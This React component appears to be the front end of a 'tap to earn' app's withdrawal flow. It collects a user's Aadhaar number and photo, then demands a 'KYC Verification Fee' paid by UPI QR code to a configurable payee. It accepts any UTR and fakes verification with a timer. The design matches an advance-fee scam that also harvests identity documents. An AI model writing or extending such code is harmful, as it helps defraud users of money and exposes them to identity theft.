import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import {
  X,
  Phone,
  Mail,
  CreditCard,
  Upload,
  QrCode as QrIcon,
  CheckCircle2,
  AlertCircle,
  Loader2,
  ArrowRight,
  ShieldCheck,
  Camera,
} from 'lucide-react';
import QRCode from 'qrcode';
import { UserProfile } from '../types';

interface KycModalProps {
  isOpen: boolean;
  onClose: () => void;
  user: UserProfile;
  walletBalance: number;
  onKycComplete: (details: {
    aadhaar: string;
    photoUrl: string;
    utr: string;
    amount: number;
  }) => void;
  customQrUrl?: string | null;
  customUpiId?: string;
}

type KycStep = 'prompt' | 'details' | 'photo' | 'qr' | 'waiting';

export const KycModal: React.FC<KycModalProps> = ({
  isOpen,
  onClose,
  user,
  walletBalance,
  onKycComplete,
  customQrUrl,
  customUpiId,
}) => {
  const [step, setStep] = useState<KycStep>('prompt');
  const [amount, setAmount] = useState<number>(walletBalance);
  const [aadhaar, setAadhaar] = useState('');
  const [photoPreview, setPhotoPreview] = useState<string | null>(null);
  const [qrCodeDataUrl, setQrCodeDataUrl] = useState<string>('');
  const [utrNumber, setUtrNumber] = useState('');
  const [error, setError] = useState<string | null>(null);

  const fileInputRef = useRef<HTMLInputElement | null>(null);

  // Active UPI ID (from props, or localStorage, or default)
  const activeUpiId =
    customUpiId ||
    localStorage.getItem('tap_to_earn_custom_upi') ||
    'taptoearn.kyc@upi';

  // Active custom QR code image (from props or localStorage)
  const activeCustomQr =
    customQrUrl !== undefined
      ? customQrUrl
      : localStorage.getItem('tap_to_earn_custom_qr');

  // Sync amount with walletBalance when modal opens
  useEffect(() => {
    if (isOpen) {
      setAmount(walletBalance);
      setStep('prompt');
      setError(null);
      setAadhaar(user.aadhaar || '');
      setPhotoPreview(user.photoUrl || null);
      setUtrNumber(user.utr || '');
    }
  }, [isOpen, walletBalance, user]);

  // Generate QR Code when entering the QR step if no custom QR image uploaded
  useEffect(() => {
    if (step === 'qr') {
      if (activeCustomQr) {
        setQrCodeDataUrl(activeCustomQr);
      } else {
        const upiString = `upi://pay?pa=${activeUpiId}&pn=TapToEarn&am=10&cu=INR&tn=KYC_Verification_${user.mobile}`;
        QRCode.toDataURL(upiString, {
          width: 240,
          margin: 2,
          color: {
            dark: '#000000',
            light: '#ffffff',
          },
        })
          .then((url) => setQrCodeDataUrl(url))
          .catch(() => {
            setQrCodeDataUrl('');
          });
      }
    }
  }, [step, user.mobile, activeCustomQr, activeUpiId]);

  if (!isOpen) return null;

  // Handle Photo selection
  const handlePhotoSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setPhotoPreview(reader.result as string);
        setError(null);
      };
      reader.readAsDataURL(file);
    }
  };

  // Step 1 validation (Aadhaar Number)
  const handleDetailsSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!aadhaar.trim()) {
      setError('Please enter your Aadhaar number');
      return;
    }
    setError(null);
    setStep('photo');
  };

  // Step 2 validation (Photo upload)
  const handlePhotoSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!photoPreview) {
      setError('Please upload a photo to continue');
      return;
    }
    setError(null);
    setStep('qr');
  };

  // Step 3 validation (UTR number)
  const handleUtrSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!utrNumber.trim()) {
      setError('Please enter the UTR number');
      return;
    }
    setError(null);
    setStep('waiting');

    // Wait state, then back to wallet and complete
    setTimeout(() => {
      onKycComplete({
        aadhaar: aadhaar.trim(),
        photoUrl: photoPreview || '',
        utr: utrNumber.trim(),
        amount: amount,
      });
      onClose();
    }, 2200);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
      <motion.div
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        exit={{ opacity: 0, scale: 0.95 }}
        className="w-full max-w-md bg-[#121a2e] border border-slate-700 rounded-3xl p-6 shadow-2xl relative overflow-hidden"
      >
        {/* Header with Title: KYC Complete */}
        <div className="flex items-center justify-between pb-3 mb-4 border-b border-slate-800">
          <div className="flex items-center gap-2">
            <div className="p-2 bg-emerald-500/20 text-emerald-400 rounded-xl border border-emerald-500/30">
              <ShieldCheck className="w-5 h-5" />
            </div>
            <div>
              <h3 className="text-lg font-bold text-white">KYC Complete</h3>
              <p className="text-xs text-slate-400">Withdrawal Verification</p>
            </div>
          </div>

          {step !== 'waiting' && (
            <button
              type="button"
              onClick={onClose}
              className="text-slate-400 hover:text-white p-1 rounded-lg cursor-pointer"
            >
              <X className="w-5 h-5" />
            </button>
          )}
        </div>

        {/* Error notification */}
        {error && (
          <div className="mb-4 p-3 rounded-xl bg-rose-950/80 border border-rose-500/40 text-rose-200 text-xs flex items-center gap-2">
            <AlertCircle className="w-4 h-4 text-rose-400 shrink-0" />
            <span>{error}</span>
          </div>
        )}

        {/* ========================================================= */}
        {/* INITIAL PROMPT: KYC Complete with Cancel & Complete Buttons */}
        {/* ========================================================= */}
        {step === 'prompt' && (
          <div className="space-y-5">
            {user.kycStatus === 'completed' && (
              <div className="p-3 rounded-xl bg-emerald-950/70 border border-emerald-500/40 text-emerald-300 text-xs flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                <span>
                  KYC is <strong>Completed & Approved</strong> for +91 {user.mobile} (ID: {user.id || `UID-${user.mobile}`})
                </span>
              </div>
            )}

            <div className="bg-[#0a0f1d] border border-slate-800 rounded-2xl p-4 space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-xs text-slate-400">Withdrawal Amount</span>
                <span className="text-xs text-emerald-400 font-semibold">
                  Balance: ₹{walletBalance.toFixed(2)}
                </span>
              </div>
              <div className="relative">
                <span className="absolute left-3.5 top-2.5 text-sm text-slate-400">₹</span>
                <input
                  type="number"
                  min="10"
                  max={walletBalance}
                  value={amount}
                  onChange={(e) => setAmount(parseFloat(e.target.value) || 0)}
                  className="w-full bg-[#121a2e] border border-slate-700 rounded-xl pl-8 pr-3.5 py-2.5 text-base font-bold text-white focus:outline-none focus:border-emerald-500"
                />
              </div>
            </div>

            <p className="text-xs text-slate-300 text-center">
              Please complete KYC verification to proceed with your withdrawal.
            </p>

            {/* Left side Cancel, Right side Complete button as explicitly specified */}
            <div className="grid grid-cols-2 gap-3 pt-2">
              <button
                type="button"
                onClick={onClose}
                className="py-3 px-4 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold text-sm border border-slate-700 transition-all cursor-pointer text-center"
              >
                Cancel
              </button>
              <button
                type="button"
                onClick={() => {
                  if (amount <= 0 || amount > walletBalance) {
                    setError('Please enter a valid amount');
                    return;
                  }
                  setError(null);
                  setStep('details');
                }}
                className="py-3 px-4 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-bold text-sm shadow-lg shadow-emerald-500/20 transition-all cursor-pointer text-center"
              >
                Complete
              </button>
            </div>
          </div>
        )}

        {/* ========================================================= */}
        {/* STEP 1: Mobile (registered), Email (registered), Aadhaar  */}
        {/* ========================================================= */}
        {step === 'details' && (
          <form onSubmit={handleDetailsSubmit} className="space-y-4">
            {/* 1. Mobile Number (at the top, pre-filled from login) */}
            <div className="space-y-1">
              <label className="text-xs font-semibold text-slate-300 flex items-center gap-1.5">
                <Phone className="w-3.5 h-3.5 text-emerald-400" />
                Mobile Number
              </label>
              <input
                type="text"
                readOnly
                value={`+91 ${user.mobile}`}
                className="w-full bg-[#0a0f1d] border border-slate-700/80 rounded-xl px-3.5 py-2.5 text-sm text-slate-300 font-medium cursor-not-allowed opacity-90"
              />
            </div>

            {/* 2. Email (below mobile number, pre-filled from login) */}
            <div className="space-y-1">
              <label className="text-xs font-semibold text-slate-300 flex items-center gap-1.5">
                <Mail className="w-3.5 h-3.5 text-emerald-400" />
                Email
              </label>
              <input
                type="email"
                readOnly
                value={user.gmail}
                className="w-full bg-[#0a0f1d] border border-slate-700/80 rounded-xl px-3.5 py-2.5 text-sm text-slate-300 font-medium cursor-not-allowed opacity-90"
              />
            </div>

            {/* 3. Aadhaar Number (below email, user can enter any number) */}
            <div className="space-y-1">
              <label className="text-xs font-semibold text-slate-300 flex items-center gap-1.5">
                <CreditCard className="w-3.5 h-3.5 text-emerald-400" />
                Aadhaar Number
              </label>
              <input
                type="text"
                required
                value={aadhaar}
                onChange={(e) => setAadhaar(e.target.value)}
                placeholder="Enter Aadhaar Number"
                className="w-full bg-[#0a0f1d] border border-slate-700 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-emerald-500 font-medium tracking-wide"
              />
            </div>

            {/* Continue Button */}
            <button
              type="submit"
              className="w-full mt-3 py-3 px-4 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-bold text-sm shadow-lg transition-all cursor-pointer flex items-center justify-center gap-2"
            >
              <span>Continue</span>
              <ArrowRight className="w-4 h-4" />
            </button>
          </form>
        )}

        {/* ========================================================= */}
        {/* STEP 2: Upload Photo & Continue                           */}
        {/* ========================================================= */}
        {step === 'photo' && (
          <form onSubmit={handlePhotoSubmit} className="space-y-4">
            <div className="space-y-2">
              <label className="text-xs font-semibold text-slate-300 flex items-center gap-1.5">
                <Camera className="w-3.5 h-3.5 text-emerald-400" />
                Upload Photo
              </label>

              {/* Upload Drop Zone / Selector */}
              <input
                ref={fileInputRef}
                type="file"
                accept="image/*"
                onChange={handlePhotoSelect}
                className="hidden"
              />

              <div
                onClick={() => fileInputRef.current?.click()}
                className={`border-2 border-dashed rounded-2xl p-5 flex flex-col items-center justify-center gap-2 cursor-pointer transition-all ${
                  photoPreview
                    ? 'border-emerald-500/60 bg-emerald-950/20'
                    : 'border-slate-700 hover:border-slate-500 bg-[#0a0f1d]'
                }`}
              >
                {photoPreview ? (
                  <div className="relative flex flex-col items-center">
                    <img
                      src={photoPreview}
                      alt="Uploaded preview"
                      className="w-28 h-28 object-cover rounded-xl border border-emerald-500/40 shadow-md"
                    />
                    <span className="text-[11px] text-emerald-400 font-medium mt-2 flex items-center gap-1">
                      <CheckCircle2 className="w-3.5 h-3.5" />
                      Photo Uploaded (Click to change)
                    </span>
                  </div>
                ) : (
                  <>
                    <div className="w-12 h-12 rounded-xl bg-slate-800 flex items-center justify-center text-slate-400">
                      <Upload className="w-6 h-6" />
                    </div>
                    <p className="text-xs font-semibold text-slate-200">
                      Click to Select or Upload Photo
                    </p>
                    <p className="text-[10px] text-slate-400">
                      JPG, PNG, or WEBP formats supported
                    </p>
                  </>
                )}
              </div>
            </div>

            {/* Continue Button */}
            <button
              type="submit"
              className="w-full mt-3 py-3 px-4 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-bold text-sm shadow-lg transition-all cursor-pointer flex items-center justify-center gap-2"
            >
              <span>Continue</span>
              <ArrowRight className="w-4 h-4" />
            </button>
          </form>
        )}

        {/* ========================================================= */}
        {/* STEP 3: QR Code, UTR input, Confirm Button                */}
        {/* ========================================================= */}
        {step === 'qr' && (
          <form onSubmit={handleUtrSubmit} className="space-y-4">
            {/* QR Code Container */}
            <div className="flex flex-col items-center justify-center p-4 bg-[#0a0f1d] border border-slate-800 rounded-2xl">
              <div className="bg-white p-3 rounded-2xl shadow-lg border-2 border-slate-200">
                {qrCodeDataUrl ? (
                  <img
                    src={qrCodeDataUrl}
                    alt="KYC Payment QR Code"
                    className="w-48 h-48 object-contain"
                  />
                ) : (
                  <div className="w-48 h-48 flex items-center justify-center">
                    <Loader2 className="w-8 h-8 animate-spin text-slate-400" />
                  </div>
                )}
              </div>
              <p className="text-xs font-semibold text-slate-300 mt-3 text-center">
                Scan QR Code to Pay KYC Verification Fee
              </p>
              <div className="mt-2 px-3 py-1 bg-slate-800 rounded-lg border border-slate-700 text-[11px] text-slate-300 font-mono flex items-center gap-1.5">
                <span className="text-slate-400">UPI ID:</span>
                <span className="text-emerald-400 font-bold">{activeUpiId}</span>
              </div>
            </div>

            {/* UTR input below QR code */}
            <div className="space-y-1.5">
              <label className="text-xs font-semibold text-slate-300">
                Enter UTR Number
              </label>
              <input
                type="text"
                required
                value={utrNumber}
                onChange={(e) => setUtrNumber(e.target.value)}
                placeholder="Enter 12-digit UTR Number"
                className="w-full bg-[#0a0f1d] border border-slate-700 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-emerald-500 font-medium tracking-wide"
              />
            </div>

            {/* Confirm Button */}
            <button
              type="submit"
              className="w-full mt-2 py-3 px-4 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-bold text-sm shadow-lg transition-all cursor-pointer flex items-center justify-center gap-2"
            >
              <span>Confirm</span>
              <CheckCircle2 className="w-4 h-4" />
            </button>
          </form>
        )}

        {/* ========================================================= */}
        {/* STEP 4: Waiting State                                     */}
        {/* ========================================================= */}
        {step === 'waiting' && (
          <div className="py-10 flex flex-col items-center justify-center text-center space-y-4">
            <div className="relative">
              <div className="w-16 h-16 rounded-full border-4 border-emerald-500/20 border-t-emerald-400 animate-spin" />
              <ShieldCheck className="w-7 h-7 text-emerald-400 absolute inset-0 m-auto animate-pulse" />
            </div>

            <div className="space-y-1">
              <h4 className="text-base font-bold text-white">Please wait...</h4>
              <p className="text-xs text-slate-400 max-w-xs">
                Verifying your KYC details and processing withdrawal...
              </p>
            </div>
          </div>
        )}
      </motion.div>
    </div>
  );
};
